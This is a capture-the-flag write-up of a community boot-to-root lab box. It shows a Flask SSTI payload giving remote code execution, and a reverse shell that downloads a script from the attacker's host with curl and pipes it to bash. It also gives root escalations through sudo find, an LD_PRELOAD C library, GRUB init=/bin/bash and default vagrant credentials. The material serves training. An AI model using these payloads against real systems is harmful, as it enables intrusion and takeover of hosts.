# Th3HackerNewsBdarija box Writeup

## Introduction 

Yo !
before starting this writeup, we would like to thank Thehackernewsbdarija community and thank the staff that created this box.

<p align="center">
  <img src="https://c.tenor.com/G0PWi59OVk0AAAAM/mr-bean-delicious.gif"/>
</p>

And i'm happy because i won this competition

<p align="center">
  <img src="https://c.tenor.com/aSW9ZfIIC64AAAAC/shaq-shimmy.gif"/>
</p>

Description [Moroccan Darija] : https://www.facebook.com/Th3HackerNewsBdarija/posts/219555037030078

Download link : https://drive.google.com/file/d/1ipYcoAsZ-uTrSpFcu4s0oo0OmBKqHwgk/view?usp=sharing

Enjoy!

## Writeup

`PS: There was a bug in the executable but the administrator fixed it in the box version 2.0`

### Web 

Let's start by finding the ip for the machine, i used netdiscover but you are free to use nmap or your router page 

```bash
netdiscover -r 192.168.1.1/24
```

Let's scan this machine with nmap 

```Bash
nmap -sV -sC -p- 192.168.1.163
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-18 20:29 UTC
Nmap scan report for 192.168.1.163
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 01:a3:09:2d:6e:91:46:12:db:e5:de:58:d6:e9:50:c5 (RSA)
|   256 11:48:e7:5c:60:fe:f1:45:ea:87:e7:84:9c:89:d9:cb (ECDSA)
|_  256 44:1b:b9:a4:44:50:64:90:81:38:94:43:4c:c3:65:97 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.24 seconds
```
As we can see we have an OpenSSH 7.6p1 running on port 22 and a web application running on port 80 with the web server Apache httpd 2.4.29 and we already know that the OS is Ubuntu 

Let's open the web page `http://192.168.1.163:80/`

![img](https://i.imgur.com/fkxEYGf.png)

Source Code 

```HTML
<html>
	<head></head>
	<title></title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

* {
    padding: 0;
    margin: 0;
    box-sizing: border-box;
    font-family: 'Press Start 2P';
    color: #FFFFFF;
    text-align: center;
}

body {
    background-color: #000000;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='42' height='58' viewBox='0 0 42 58'%3E%3Cg fill='%23dddcdd' fill-opacity='0.23'%3E%3Cpath fill-rule='evenodd' d='M12 18h12v18h6v4H18V22h-6v-4zm-6-2v-4H0V0h36v6h6v36h-6v4h6v12H6v-6H0V16h6zM34 2H2v8h24v24h8V2zM6 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm8 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm8 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm8 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm0 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm0 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm0 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zM2 50h32v-8H10V18H2v32zm28-6a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm-8 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm-8 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm-8 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm0-8a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm0-8a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm0-8a2 2 0 1 0 0 4 2 2 0 0 0 0-4z'/%3E%3C/g%3E%3C/svg%3E");
}

section.notFound {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 0 5%;
    height: 100vh;
}

section.notFound h1 {
    color: red;
    font-size: 100px;
}

section.notFound h2 {
    font-size: 50px;
}

section.notFound h1, h2, h3 {
    margin-bottom: 40px;
}

div.text {
    height: 50vh;
}

div.text a {
    text-decoration: none;
    margin-right: 20px;
}

div.text a:hover {
    color: red;
    text-decoration: underline;
}

@media only screen and (max-width: 768px) {
    section.notFound {
        flex-direction: column;
        justify-content: space-around;
    }
    section.notFound div.img img {
        width: 70vw;
        height: auto;
    }
    section.notFound h1 {
        font-size: 50px;
    }
    section.notFound h2 {
        font-size: 25px;
    }
    div.text a:active {
    color: red;
    text-decoration: underline;
  }
}</style>
	<body>
    <section class="notFound">
        <div class="img">
		<h2>TH3 HACKER NEWS B'DARIJA</h2>
		<img src="https://cdn.dribbble.com/users/2686403/screenshots/6472886/image.gif" />

<embed src="../trap.mp3" loop="true" autostart="true" width="2"
         height="0">

	</div>
	
    </section>
</body>
</html>
```

There's nothing interested to keep digging, i used `Gobuster` to find subdirectories but i only have found `http://192.168.1.163/server-status` 

I tried to fuzz on parameters to detect any parametes

![bigdd](https://imgur.com/aB2aOjP.png)

After getting the `search` parameter we can remark that it is infected by a `Flask SSTI2` vulnerability 

`http://192.168.1.163/?search={{3 * 3}}`

![pp](https://i.imgur.com/bv4O3OD.png)

We can exploit that to get an rce

`http://192.168.1.163/?search={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

![bigppp](https://i.imgur.com/yAlE8Vt.png)

Getting a reverse shell
    localhost :

```bash
echo "/bin/bash -l > /dev/tcp/192.168.1.163/4444 0<&1 2>&1" > payload.sh
python -m SimpleHTTPServer
nc -nlvp 4444
```

    Server : http://192.168.1.163/?search={{request.application.__globals__.__builtins__.__import__('os').popen('curl http://192.168.1.109:8000/payload.sh | bash').read()}}

and we got a shell : 

```Bash
┌[Sc4r3Cr0w]─[23:05-18/12]─[/home/unclej4ck]
└╼unclej4ck$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.1.163] from (UNKNOWN) [192.168.1.162] 48990
/bin/sh: 0: can't access tty; job control turned off
````

### Pwn 

After getting a shell as data we can see an executable `hackernews`, this executable asks for a password 

```Bash
www-data@thehackernewsbdarija:/home/c3p0$ ./hackernews
What is the password?
````
We can simply find the password by using strings 

![pwn](https://i.imgur.com/zQQk7CC.png)

By submitting the file we get an encoded password 

![pp](https://i.imgur.com/NgVg2i5.png)

The encoded password is encoded with Vigenere cipher with decode.fr

![hh](https://imgur.com/8IWQ4BL.png)

Let's ssh into `c3p0` account now 

`ssh c3p0@192.168.1.163`

We found the first flag

`user.txt : thnb{m4b9a_w4l0_4lm0jt4h1D}`

### Privelege esculation

Using `sudo -l` to check user priveleges, we can see that `c3p0` user can execute the find command as root user.

![find](https://i.imgur.com/2xhEgge.png)

We can exploit that using gftobins 

![sudo](https://imgur.com/WjO72Kg.png)

```bash
sudo find . -exec /bin/sh \; -quit
```

Eventually after using this command we can get a shell as root and read the flag

![root](https://imgur.com/feER4s4.png)

`root flag : thnb{br4v0_4kh4y_lH4ck3r_y0u_d1D_1t}`

### Privelege esculation 2

There's another technique for privilige escalation by exploiting the environment variable “LD_Preload”

As we can see by typing sudo -l we detected the environment variable

![ld](https://i.imgur.com/K5mSsMI.png)

Let’s create a C program file inside /tmp directory

![sh](https://i.imgur.com/CK0HxPt.png)

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {

unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");

}
```

![sh](https://i.imgur.com/fBG2766.png)

Let's compile it and execute it 

```Bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
id
whoami
```

![ld](https://i.imgur.com/00Ba4Nc.png)

And we are root! 

## Other techniques

### Ubuntu Recovering Password 

We can get root by using Ubuntu recovering password

Once you boot your machine keep holding on `SHIFT` to enter The grub menu

![ub](https://i.imgur.com/TTvYvdX.png)

Then press on `E` on your keyboard to edit the grub panel 

![ub](https://i.imgur.com/ejJ3irz.png)

Find any line starting with “Linux” and change access from read-only to read-write by just replacing ro `console=tty1 console=ttyS0` to `rw init=/bin/bash`

![pp](https://i.imgur.com/UwnUmmI.png)

To save the changes and to boot, press `Ctrl-x` and now booting with both read and write access into a Linux kernel

![popp](https://i.imgur.com/VI2VwE8.png)

Type passwd and enter a new password 

![bip](https://i.imgur.com/DZU7WsT.png)

Reboot your machine and login with root and the new password that you created

![peed](https://i.imgur.com/VNLz4T6.png)

And now we have access to both flags

![user](https://i.imgur.com/Upxz1AX.png)

![root](https://i.imgur.com/YhPJunl.png)

### Vagrant SSH 

By default in a box, vagrant user is enabled in the ssh config

```Bash
User vagrant
IdentityFile ~/.ssh/vagrant
````

Let's try to log in with the `USER:PASS = vagrant:vagrant`
 
 ```Bash
 ssh vagrant@192.168.1.109
 ```

It works

![ssh](https://i.imgur.com/yhXFTtu.png)

let's run `sudo -l` to check user priveleges

![ssh](https://i.imgur.com/U98OK4R.png)

We can see that we can run any command as root

Let's run `sudo -s` and we got root 

![ssh](https://i.imgur.com/IJ0zluF.png)


# Conclusion 

I hope you like the writeup 
Good Hacking ! Peace
